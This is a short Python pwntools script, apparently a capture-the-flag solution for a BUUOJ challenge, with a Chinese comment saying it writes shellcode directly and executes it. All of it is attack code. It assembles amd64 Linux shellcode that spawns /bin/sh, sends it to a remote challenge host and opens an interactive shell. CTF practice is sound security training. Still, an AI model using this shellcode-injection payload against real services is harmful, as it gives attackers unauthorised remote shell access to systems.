from pwn import *

context.os = 'linux'
context.arch = 'amd64'

shellcode = asm(shellcraft.sh())
p = remote('node4.buuoj.cn', 27282)
p.send(shellcode)
p.interactive()

# 直接写入shellcode，执行